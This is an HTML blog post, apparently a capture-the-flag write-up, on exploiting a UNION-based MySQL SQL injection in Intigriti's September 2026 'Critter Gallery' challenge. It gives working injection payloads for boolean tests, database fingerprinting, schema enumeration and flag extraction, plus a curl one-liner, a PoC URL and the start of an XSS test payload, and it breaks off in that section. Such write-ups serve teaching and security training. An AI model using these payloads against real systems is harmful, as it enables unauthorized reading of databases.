@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Critter Gallery SQLi - Intigriti September 2026 Challenge | iwd</title>
+<meta name="description" content="How a case-sensitivity differential between the emoji and description lookups revealed a MySQL backend and a UNION-based injection that reads the full database.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0a0f;
+  --bg2:#10101a;
+  --bg3:#161625;
+  --surface:#1a1a2e;
+  --border:#2a2a4a;
+  --text:#e0e0f0;
+  --text-dim:#8888aa;
+  --accent:#00ff88;
+  --accent2:#00ccff;
+  --accent3:#ff6b6b;
+  --accent-glow:rgba(0,255,136,0.15);
+  --accent2-glow:rgba(0,204,255,0.15);
+  --gold:#ffd700;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Inter',-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  overflow-x:hidden;
+  line-height:1.7;
+}
+::selection{background:var(--accent);color:var(--bg)}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
+
+/* MATRIX */
+#matrix-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.05;pointer-events:none}
+
+/* NAV */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  padding:16px 40px;
+  display:flex;align-items:center;justify-content:space-between;
+  background:rgba(10,10,15,0.85);
+  backdrop-filter:blur(20px);
+  border-bottom:1px solid transparent;
+  transition:all 0.3s;
+}
+nav.scrolled{border-bottom-color:var(--border)}
+.nav-logo{
+  font-family:'JetBrains Mono',monospace;
+  font-weight:700;font-size:18px;color:var(--accent);
+  text-decoration:none;letter-spacing:-0.5px;
+}
+.nav-logo span{color:var(--text-dim)}
+.nav-links{display:flex;gap:28px;list-style:none;align-items:center}
+.nav-links a{
+  color:var(--text-dim);text-decoration:none;font-size:13px;
+  font-weight:500;transition:color 0.3s;position:relative;
+}
+.nav-links a:hover{color:var(--accent)}
+.nav-links a::after{
+  content:'';position:absolute;bottom:-4px;left:0;
+  width:0;height:2px;background:var(--accent);transition:width 0.3s;
+}
+.nav-links a:hover::after{width:100%}
+.nav-back{
+  font-family:'JetBrains Mono',monospace;font-size:12px;
+  color:var(--text-dim);text-decoration:none;
+  display:flex;align-items:center;gap:6px;
+  padding:8px 14px;border-radius:6px;
+  border:1px solid var(--border);
+  transition:all 0.3s;
+}
+.nav-back:hover{color:var(--accent);border-color:var(--accent);background:var(--accent-glow)}
+
+/* HERO */
+.post-hero{
+  min-height:70vh;display:flex;align-items:center;
+  padding:140px 40px 80px;
+  position:relative;z-index:1;
+  border-bottom:1px solid var(--border);
+}
+.post-hero::before{
+  content:'';position:absolute;
+  inset:0;
+  background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(0,255,136,0.05) 0%,transparent 70%);
+  pointer-events:none;
+}
+.hero-inner{max-width:860px;margin:0 auto;width:100%;animation:fadeUp 0.9s ease-out}
+@keyframes fadeUp{from{opacity:0;transform:translateY(28px)}to{opacity:1;transform:translateY(0)}}
+
+.post-tag-row{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:28px;align-items:center}
+.ptag{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;font-weight:500;
+  padding:3px 8px;border-radius:0;
+  letter-spacing:0.06em;background:none;border:none;
+}
+.ptag::before{content:'[';margin-right:2px;opacity:0.45}
+.ptag::after {content:']';margin-left:2px;opacity:0.45}
+.ptag-red  {color:var(--accent3)}
+.ptag-green{color:var(--accent)}
+.ptag-blue {color:var(--accent2)}
+.ptag-gold {color:var(--gold)}
+
+.post-title{
+  font-size:clamp(28px,5vw,54px);font-weight:900;
+  line-height:1.1;margin-bottom:20px;
+  background:linear-gradient(135deg,var(--text) 0%,var(--accent) 60%,var(--accent2) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+}
+.post-subtitle{
+  font-size:17px;color:var(--text-dim);
+  max-width:640px;line-height:1.7;margin-bottom:32px;
+}
+.post-meta-row{
+  display:flex;flex-wrap:wrap;gap:24px;
+  padding-top:24px;border-top:1px solid var(--border);
+  font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-dim);
+}
+.post-meta-row span{display:flex;align-items:center;gap:6px}
+.post-meta-row .accent-val{color:var(--accent);font-weight:600}
+.post-meta-row .blue-val{color:var(--accent2)}
+
+/* LAYOUT */
+.post-body{
+  max-width:860px;margin:0 auto;
+  padding:64px 40px 100px;
+  position:relative;z-index:1;
+}
+
+/* SECTION HEADINGS */
+.post-body h2{
+  font-size:24px;font-weight:800;
+  margin:60px 0 20px;padding-bottom:12px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:10px;
+}
+.post-body h2 .sh-tag{
+  font-family:'JetBrains Mono',monospace;
+  font-size:13px;color:var(--accent);font-weight:500;
+}
+.post-body h3{
+  font-size:17px;font-weight:700;
+  color:var(--accent2);margin:36px 0 14px;
+}
+.post-body p{
+  color:var(--text-dim);margin-bottom:18px;
+  font-size:15px;line-height:1.8;
+}
+.post-body p strong{color:var(--text)}
+.post-body a{color:var(--accent);text-decoration:none;border-bottom:1px solid rgba(0,255,136,0.3);transition:all 0.2s}
+.post-body a:hover{border-bottom-color:var(--accent)}
+
+/* CALLOUT BOXES */
+.callout{
+  border-radius:10px;padding:20px 24px;
+  margin:28px 0;border-left:3px solid;
+  font-size:14px;line-height:1.7;
+}
+.callout strong{display:block;margin-bottom:6px;font-size:13px;text-transform:uppercase;letter-spacing:0.06em}
+.callout-red  {background:rgba(255,107,107,0.07);border-color:var(--accent3);color:var(--text-dim)}
+.callout-red  strong{color:var(--accent3)}
+.callout-green{background:rgba(0,255,136,0.06);border-color:var(--accent);color:var(--text-dim)}
+.callout-green strong{color:var(--accent)}
+.callout-blue {background:rgba(0,204,255,0.06);border-color:var(--accent2);color:var(--text-dim)}
+.callout-blue strong{color:var(--accent2)}
+.callout-yellow{background:rgba(255,215,0,0.06);border-color:var(--gold);color:var(--text-dim)}
+.callout-yellow strong{color:var(--gold)}
+
+/* TERMINAL / CODE */
+.code-block{
+  background:#0d0d16;
+  border:1px solid var(--border);border-radius:10px;
+  margin:20px 0 28px;overflow:hidden;
+  box-shadow:0 8px 32px rgba(0,0,0,0.4);
+}
+.code-block-header{
+  background:var(--surface);
+  border-bottom:1px solid var(--border);
+  padding:10px 16px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.code-block-header .dots{display:flex;gap:6px}
+.dot{width:11px;height:11px;border-radius:50%}
+.dot.r{background:#ff5f57}.dot.y{background:#febc2e}.dot.g{background:#28c840}
+.code-block-header .file-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;color:var(--text-dim);
+}
+.code-block-header .lang-badge{
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;font-weight:700;
+  padding:2px 8px;border-radius:4px;
+  background:var(--accent-glow);color:var(--accent);
+  border:1px solid rgba(0,255,136,0.2);
+  text-transform:uppercase;
+}
+pre{
+  padding:22px 20px;
+  overflow-x:auto;
+  font-family:'JetBrains Mono',monospace;
+  font-size:13px;line-height:1.65;
+  tab-size:4;
+}
+.kw{color:#ff79c6}
+.fn{color:#50fa7b}
+.str{color:#f1fa8c}
+.cmt{color:#6272a4;font-style:italic}
+.var{color:#8be9fd}
+.num{color:#bd93f9}
+.type{color:#ffb86c}
+.hl{display:block;margin:0 -20px;padding:0 20px;background:rgba(255,215,0,0.06)}
+.bad{display:block;margin:0 -20px;padding:0 20px;background:rgba(255,85,85,0.12)}
+
+/* INLINE CODE */
+code{
+  font-family:'JetBrains Mono',monospace;
+  font-size:12.5px;
+  background:rgba(255,255,255,0.06);
+  border:1px solid var(--border);
+  border-radius:4px;padding:1px 6px;
+  color:#e0e0f0;
+}
+
+/* FLOW STEPS */
+.flow{display:flex;flex-direction:column;gap:0;margin:28px 0}
+.flow-step{
+  display:flex;gap:20px;padding:20px 0;
+  border-bottom:1px solid var(--border);
+}
+.flow-step:last-child{border-bottom:none}
+.step-num{
+  width:32px;height:32px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'JetBrains Mono',monospace;font-weight:700;font-size:13px;
+  flex-shrink:0;margin-top:2px;
+}
+.step-num.green{background:rgba(0,255,136,0.15);color:var(--accent);border:1px solid rgba(0,255,136,0.3)}
+.step-num.red{background:rgba(255,107,107,0.15);color:var(--accent3);border:1px solid rgba(255,107,107,0.3)}
+.step-num.blue{background:rgba(0,204,255,0.15);color:var(--accent2);border:1px solid rgba(0,204,255,0.3)}
+.step-body{flex:1}
+.step-body strong{color:var(--text);display:block;margin-bottom:6px;font-size:15px}
+.step-body p{margin:0;font-size:14px}
+
+/* TABLE */
+.table-wrap{
+  border-radius:10px;border:1px solid var(--border);
+  overflow:hidden;margin:24px 0 32px;
+  background:var(--surface);
+}
+table{width:100%;border-collapse:collapse;font-size:13.5px}
+thead{background:var(--bg)}
+th{
+  padding:13px 18px;text-align:left;
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;text-transform:uppercase;
+  letter-spacing:0.08em;color:var(--accent);
+  font-weight:600;border-bottom:2px solid var(--border);
+}
+td{
+  padding:14px 18px;border-bottom:1px solid var(--border);
+  color:var(--text-dim);vertical-align:top;line-height:1.6;
+}
+tbody tr:last-child td{border-bottom:none}
+tbody tr{transition:background 0.2s}
+tbody tr:hover{background:rgba(0,255,136,0.03)}
+td strong{color:var(--text)}
+td code{font-size:12px}
+
+/* IMAGE FRAME */
+.img-frame{
+  border-radius:12px;border:1px solid var(--border);
+  overflow:hidden;margin:24px 0 32px;
+  background:var(--surface);
+  box-shadow:0 8px 40px rgba(0,0,0,0.5);
+}
+.img-frame img{
+  width:100%;display:block;
+}
+.img-cap{
+  padding:12px 18px;
+  border-top:1px solid var(--border);
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;color:var(--text-dim);
+  letter-spacing:0.03em;
+  display:flex;align-items:center;gap:8px;
+}
+.img-cap::before{
+  content:'//';
+  color:var(--accent);
+  font-weight:700;
+}
+
+/* FLAG CARD */
+.flag-card{
+  background:linear-gradient(135deg,rgba(0,255,136,0.08) 0%,rgba(0,204,255,0.06) 100%);
+  border:2px solid var(--accent);border-radius:14px;
+  padding:32px;margin:32px 0;text-align:center;
+  box-shadow:0 0 60px rgba(0,255,136,0.1);
+  position:relative;overflow:hidden;
+}
+.flag-card::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(circle at 50% 0%,rgba(0,255,136,0.12) 0%,transparent 60%);
+  pointer-events:none;
+}
+.flag-card .flag-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;text-transform:uppercase;
+  letter-spacing:0.15em;color:var(--accent);
+  margin-bottom:16px;font-weight:700;
+}
+.flag-card .flag-value{
+  font-family:'JetBrains Mono',monospace;
+  font-size:clamp(14px,2.5vw,22px);font-weight:700;
+  color:var(--text);word-break:break-all;
+  line-height:1.6;
+}
+
+/* REVEAL ANIMATIONS */
+.reveal{opacity:0;transform:translateY(24px);transition:opacity 0.6s cubic-bezier(.16,1,.3,1),transform 0.6s cubic-bezier(.16,1,.3,1)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+
+/* TOC */
+.toc{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:10px;padding:24px 28px;margin:40px 0;
+  position:relative;overflow:hidden;
+}
+.toc::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+}
+.toc-title{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;text-transform:uppercase;letter-spacing:0.1em;
+  color:var(--accent);margin-bottom:14px;
+}
+.toc ol{padding-left:20px}
+.toc li{margin-bottom:6px;font-size:14px}
+.toc a{color:var(--text-dim);text-decoration:none;border:none;transition:color 0.2s}
+.toc a:hover{color:var(--accent)}
+
+/* FOOTER */
+.post-footer{
+  text-align:center;padding:48px 40px;
+  border-top:1px solid var(--border);
+  font-family:'JetBrains Mono',monospace;
+  font-size:13px;color:var(--text-dim);
+  position:relative;z-index:1;
+}
+.post-footer .accent{color:var(--accent)}
+.post-footer .back-link{
+  display:inline-flex;align-items:center;gap:8px;
+  margin-top:20px;color:var(--text-dim);
+  text-decoration:none;border:1px solid var(--border);
+  padding:10px 20px;border-radius:8px;
+  font-size:12px;transition:all 0.3s;
+}
+.post-footer .back-link:hover{color:var(--accent);border-color:var(--accent);background:var(--accent-glow)}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  nav{padding:12px 20px}
+  .nav-links{display:none}
+  .post-hero{padding:110px 20px 60px;min-height:auto}
+  .post-body{padding:40px 20px 80px}
+  pre{font-size:12px}
+  .flag-card .flag-value{font-size:13px}
+}
+</style>
+</head>
+<body>
+
+<canvas id="matrix-bg"></canvas>
+
+<nav id="navbar">
+  <a href="../" class="nav-logo">&lt;AK<span>/&gt;</span></a>
+  <ul class="nav-links">
+    <li><a href="../#about">About</a></li>
+    <li><a href="../#cves">CVEs</a></li>
+    <li><a href="../#writeups">Writeups</a></li>
+    <li><a href="../#contact">Contact</a></li>
+  </ul>
+  <a href="../" class="nav-back">&larr; Back</a>
+</nav>
+
+<!-- HERO -->
+<div class="post-hero">
+  <div class="hero-inner">
+    <div class="post-tag-row">
+      <span class="ptag ptag-red">INTIGRITI CTF</span>
+      <span class="ptag ptag-gold">CVSS 8.7 HIGH</span>
+      <span class="ptag ptag-green">SQL INJECTION</span>
+      <span class="ptag ptag-blue">UNION-BASED</span>
+    </div>
+
+    <h1 class="post-title">Critter Gallery SQLi<br>Intigriti September 2026</h1>
+
+    <p class="post-subtitle">
+      How a case-sensitivity differential between the emoji and description lookups
+      revealed a MySQL backend - and a UNION-based injection that reads the full database.
+    </p>
+
+    <div class="post-meta-row">
+      <span>// <span class="accent-val">Alaaeddine Knani</span></span>
+      <span>&#128197; <span class="blue-val">Sep 2026</span></span>
+      <span>&#9201; <span class="blue-val">10 min read</span></span>
+      <span>&#9989; <span class="accent-val">Accepted</span></span>
+      <span>&#128279; <a href="https://challenge-0926.challenges.intigriti.io/challenge.php" target="_blank" rel="noopener noreferrer" style="color:var(--accent2);border:none">Challenge page &nearr;</a></span>
+    </div>
+  </div>
+</div>
+
+<!-- BODY -->
+<div class="post-body">
+
+  <!-- TOC -->
+  <div class="toc reveal">
+    <div class="toc-title">// Table of Contents</div>
+    <ol>
+      <li><a href="#s1">Reconnaissance</a></li>
+      <li><a href="#s2">Spotting the normalisation differential</a></li>
+      <li><a href="#s3">Breaking the query</a></li>
+      <li><a href="#s4">Confirming the injection</a></li>
+      <li><a href="#s5">Fingerprinting the database</a></li>
+      <li><a href="#s6">Enumerating the schema</a></li>
+      <li><a href="#s7">Extracting the flag</a></li>
+      <li><a href="#s8">Why it's SQLi, not XSS</a></li>
+      <li><a href="#s9">Key observations</a></li>
+    </ol>
+  </div>
+
+  <!-- FLAG CARD -->
+  <div class="flag-card reveal">
+    <div class="flag-label">&#127937; Captured Flag</div>
+    <div class="flag-value">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</div>
+  </div>
+
+  <!-- S1 -->
+  <h2 id="s1"><span class="sh-tag">01 //</span> Reconnaissance</h2>
+
+  <p>
+    The challenge page at <code>/challenge.php</code> is a "Critter Gallery" - eight animal tiles,
+    each linking to a detail view via <code>?pic=&lt;base64&gt;</code>.
+    The <code>pic</code> value decodes to a plain animal name: <code>Zm94</code> decodes to <code>fox</code>,
+    <code>cGFuZGE=</code> to <code>panda</code>, and so on.
+  </p>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/01_baseline_fox.png" alt="Gallery baseline - the fox detail card">
+    <div class="img-cap">Baseline detail card for the fox critter</div>
+  </div>
+
+  <p>
+    Clicking a tile loads a detail card with three pieces of data:
+  </p>
+
+  <div class="table-wrap reveal">
+    <table>
+      <thead><tr><th>Element</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Emoji</strong> <code>&lt;div class="art"&gt;</code></td><td>&#129418;</td></tr>
+        <tr><td><strong>Name</strong> <code>&lt;h2&gt;</code></td><td>fox</td></tr>
+        <tr><td><strong>Description</strong> <code>&lt;div class="desc"&gt;</code></td><td>The red fox is a clever, highly adaptable hunter.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>
+    The name is the decoded <code>pic</code> value, HTML-escaped.
+    The emoji and description are looked up from the name.
+    An invalid name shows a default painting emoji and the text <em>"No critter goes by that name yet."</em>
+  </p>
+
+  <!-- S2 -->
+  <h2 id="s2"><span class="sh-tag">02 //</span> Spotting the normalisation differential</h2>
+
+  <p>
+    Before breaking anything, I tested case variations of a known name:
+  </p>
+
+  <div class="table-wrap reveal">
+    <table>
+      <thead><tr><th>pic decodes to</th><th>Emoji</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code>fox</code></td><td>&#129418; (correct)</td><td>&#9989; fox's description</td></tr>
+        <tr><td><code>FOX</code></td><td>&#128444;&#65039; (default)</td><td>&#9989; fox's description</td></tr>
+        <tr><td><code>Fox</code></td><td>&#128444;&#65039; (default)</td><td>&#9989; fox's description</td></tr>
+        <tr><td><code>fOX</code></td><td>&#128444;&#65039; (default)</td><td>&#9989; fox's description</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>
+    The emoji only appears for the <strong>exact</strong> lowercase name - it's a case-sensitive lookup,
+    likely a PHP array (<code>$emojis['fox']</code>).
+  </p>
+
+  <p>
+    But the description is returned regardless of case.
+    That's the tell: <strong>case-insensitive string matching is the default behaviour of a MySQL
+    <code>utf8mb4_..._ci</code> collation</strong>.
+    Two different normalisation strategies mean two different backends - the emoji comes from
+    application code, but the description is resolved by a SQL query.
+  </p>
+
+  <div class="callout callout-green reveal">
+    <strong>The key insight</strong>
+    When two outputs derived from the same input use different normalisation rules,
+    they come from different backends. A case-insensitive one in a PHP app almost always means MySQL
+    with a <code>_ci</code> collation.
+  </div>
+
+  <!-- S3 -->
+  <h2 id="s3"><span class="sh-tag">03 //</span> Breaking the query</h2>
+
+  <p>
+    If the decoded name goes into a SQL query, a single quote should break it:
+  </p>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">single-quote test</span>
+      <span class="lang-badge">bash</span>
+    </div>
+    <pre><code><span class="cmt"># pic = base64("'") = Jw==</span>
+curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
+  "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Jw%3D%3D"
+
+<span class="cmt"># code=200 size=0</span></code></pre>
+  </div>
+
+  <p>
+    <strong>HTTP 200 with a zero-byte body</strong> - not a WAF block, not a validation error page,
+    but a silent crash. This is what an uncaught PDO exception looks like when
+    <code>display_errors</code> is off. The backslash <code>\</code> also triggers
+    the same empty response, while every non-special character returns a normal page.
+  </p>
+
+  <p>
+    That's strong evidence: the decoded <code>pic</code> value is concatenated into a SQL string
+    literal without escaping.
+  </p>
+
+  <!-- S4 -->
+  <h2 id="s4"><span class="sh-tag">04 //</span> Confirming the injection</h2>
+
+  <h3>Boolean differential</h3>
+
+  <p>
+    The classic test: inject a condition that is true, then one that is false,
+    and observe the difference.
+  </p>
+
+  <p><strong>True condition</strong> - <code>fox' AND '1'='1</code>:</p>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/02_bool_true.png" alt="Boolean TRUE - fox's description is returned">
+    <div class="img-cap">Boolean TRUE - fox's description is returned</div>
+  </div>
+
+  <p>Fox's description is displayed - the query returns a row.</p>
+
+  <p><strong>False condition</strong> - <code>fox' AND '1'='2</code>:</p>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/03_bool_false.png" alt="Boolean FALSE - no description returned">
+    <div class="img-cap">Boolean FALSE - "No critter goes by that name yet."</div>
+  </div>
+
+  <p>
+    <em>"No critter goes by that name yet."</em> - the injected <code>AND</code> clause
+    made the <code>WHERE</code> false, so no row came back.
+    This confirms classic <strong>string-based SQL injection</strong> - we control the WHERE clause.
+  </p>
+
+  <h3>UNION proof</h3>
+
+  <p>To prove we can inject entirely new result rows:</p>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">UNION test</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>fox' UNION SELECT 'INJECTED-BY-UNION</code></pre>
+  </div>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/04_union_proof.png" alt="UNION proof - attacker-controlled text appended">
+    <div class="img-cap">UNION injects an attacker-controlled row into the description</div>
+  </div>
+
+  <p>
+    The real fox description appears, followed by our injected string <code>INJECTED-BY-UNION</code>
+    on the next line. The underlying query is therefore:
+  </p>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">inferred query</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code><span class="kw">SELECT</span> description <span class="kw">FROM</span> animals <span class="kw">WHERE</span> name = <span class="str">'&lt;decoded pic&gt;'</span></code></pre>
+  </div>
+
+  <div class="callout callout-blue reveal">
+    <strong>Single-column constraint</strong>
+    A two-column <code>UNION SELECT '1','2'</code> returns the zero-byte error (column count mismatch).
+    Every extraction payload must project exactly one column, and <code>GROUP_CONCAT()</code> is
+    needed to pull multiple values through that single slot.
+  </div>
+
+  <!-- S5 -->
+  <h2 id="s5"><span class="sh-tag">05 //</span> Fingerprinting the database</h2>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">fingerprint</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>x' <span class="kw">UNION SELECT</span> <span class="fn">CONCAT</span>(<span class="var">@@version</span>,<span class="str">' / '</span>,<span class="fn">database</span>(),<span class="str">' / '</span>,<span class="fn">user</span>())<span class="cmt">-- -</span></code></pre>
+  </div>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/05_version_db_user.png" alt="Database fingerprint">
+    <div class="img-cap">MySQL 8.0.46 / critter_gallery / gallery@10.18.49.50</div>
+  </div>
+
+  <div class="table-wrap reveal">
+    <table>
+      <thead><tr><th>Property</th><th>Value</th></tr></thead>
+      <tbody>
+        <tr><td><strong>DBMS</strong></td><td>MySQL <code>8.0.46</code></td></tr>
+        <tr><td><strong>Database</strong></td><td><code>critter_gallery</code></td></tr>
+        <tr><td><strong>User</strong></td><td><code>gallery@10.18.49.50</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout callout-yellow reveal">
+    <strong>MySQL comment syntax gotcha</strong>
+    MySQL's <code>--</code> comment requires a trailing space to be recognised.
+    A bare <code>fox'--</code> (no space) triggers the zero-byte crash page.
+    Using <code>-- -</code> (dash-dash-space-dash) is a reliable workaround - the extra
+    <code>-</code> is just filler after the space.
+  </div>
+
+  <!-- S6 -->
+  <h2 id="s6"><span class="sh-tag">06 //</span> Enumerating the schema</h2>
+
+  <h3>Tables</h3>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">table enum</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>x' <span class="kw">UNION SELECT</span> (<span class="kw">SELECT</span> <span class="fn">GROUP_CONCAT</span>(table_name)
+                 <span class="kw">FROM</span> information_schema.tables
+                 <span class="kw">WHERE</span> table_schema=<span class="fn">database</span>())<span class="cmt">-- -</span></code></pre>
+  </div>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/06_tables.png" alt="Table enumeration - animals, secret_vault">
+    <div class="img-cap">Two tables: animals and secret_vault</div>
+  </div>
+
+  <p>
+    Two tables: <code>animals</code> (the gallery data) and <strong><code>secret_vault</code></strong>
+    - a table that no feature of the application exposes.
+  </p>
+
+  <h3>Columns of <code>secret_vault</code></h3>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">column enum</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>x' <span class="kw">UNION SELECT</span> (<span class="kw">SELECT</span> <span class="fn">GROUP_CONCAT</span>(table_name,<span class="str">'.'</span>,column_name,<span class="str">' '</span>,column_type)
+                 <span class="kw">FROM</span> information_schema.columns
+                 <span class="kw">WHERE</span> table_schema=<span class="fn">database</span>()
+                 <span class="kw">AND</span> table_name=<span class="str">'secret_vault'</span>)<span class="cmt">-- -</span></code></pre>
+  </div>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/07_columns.png" alt="Column enumeration - secret_vault schema">
+    <div class="img-cap">secret_vault.id int, secret_vault.note varchar(255)</div>
+  </div>
+
+  <div class="table-wrap reveal">
+    <table>
+      <thead><tr><th>Column</th><th>Type</th></tr></thead>
+      <tbody>
+        <tr><td><code>id</code></td><td><code>int</code></td></tr>
+        <tr><td><code>note</code></td><td><code>varchar(255)</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- S7 -->
+  <h2 id="s7"><span class="sh-tag">07 //</span> Extracting the flag</h2>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">flag extraction</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>x' <span class="kw">UNION SELECT</span> note <span class="kw">FROM</span> secret_vault<span class="cmt">-- -</span></code></pre>
+  </div>
+
+  <div class="img-frame reveal">
+    <img src="images/intigriti-0926/08_FLAG.png" alt="Flag extracted">
+    <div class="img-cap">Flag rendered in the description panel</div>
+  </div>
+
+  <div class="flag-card reveal">
+    <div class="flag-label">&#127937; Flag</div>
+    <div class="flag-value">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</div>
+  </div>
+
+  <!-- Payload table -->
+  <h3>All payloads</h3>
+
+  <p>
+    Every payload goes through the same encoding pipeline:
+    <code>raw SQL</code> &#8594; <code>base64</code> &#8594; <code>URL-encode</code>
+    (replacing <code>+</code> with <code>%2B</code>, <code>/</code> with <code>%2F</code>,
+    <code>=</code> with <code>%3D</code>).
+  </p>
+
+  <div class="table-wrap reveal">
+    <table>
+      <thead><tr><th>Step</th><th>Decoded payload</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td>Boolean TRUE</td><td><code>fox' AND '1'='1</code></td><td>Confirm injection</td></tr>
+        <tr><td>Boolean FALSE</td><td><code>fox' AND '1'='2</code></td><td>Confirm WHERE-clause control</td></tr>
+        <tr><td>UNION proof</td><td><code>fox' UNION SELECT 'INJECTED-BY-UNION</code></td><td>Prove row injection</td></tr>
+        <tr><td>Fingerprint</td><td><code>x' UNION SELECT CONCAT(@@version,' / ',database(),' / ',user())-- -</code></td><td>MySQL version, db, user</td></tr>
+        <tr><td>Tables</td><td><code>x' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())-- -</code></td><td>List tables</td></tr>
+        <tr><td>Columns</td><td><code>x' UNION SELECT (SELECT GROUP_CONCAT(table_name,'.',column_name,' ',column_type) FROM information_schema.columns WHERE table_schema=database() AND table_name='secret_vault')-- -</code></td><td>List columns</td></tr>
+        <tr><td><strong>Flag</strong></td><td><code>x' UNION SELECT note FROM secret_vault-- -</code></td><td><strong>Read the flag</strong></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Reproduction one-liner</h3>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">reproduce.sh</span>
+      <span class="lang-badge">bash</span>
+    </div>
+    <pre><code>curl -s "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=$(
+  printf '%s' "x' UNION SELECT note FROM secret_vault-- -" | base64 -w0
+)" | grep -oP '(?&lt;=&lt;div class="desc"&gt;).*(?=&lt;br&gt;)'</code></pre>
+  </div>
+
+  <h3>Final PoC URL</h3>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">PoC URL</span>
+      <span class="lang-badge">url</span>
+    </div>
+    <pre><code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=eCcgVU5JT04gU0VMRUNUIG5vdGUgRlJPTSBzZWNyZXRfdmF1bHQtLSAt</code></pre>
+  </div>
+
+  <!-- S8 -->
+  <h2 id="s8"><span class="sh-tag">08 //</span> Why it's SQLi, not XSS</h2>
+
+  <p>
+    At first glance, injecting content into the page's description panel might look like
+    it could lead to XSS. I tested:
+  </p>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">XSS test</span>
+      <span class="lang-badge">sql</span>
+    </div>
+    <pre><code>x' <span class="kw">UNION SELECT</span> <span class="str">'&lt;img src=x onerror=alert(document.domain)&gt;'</span></code></pre>
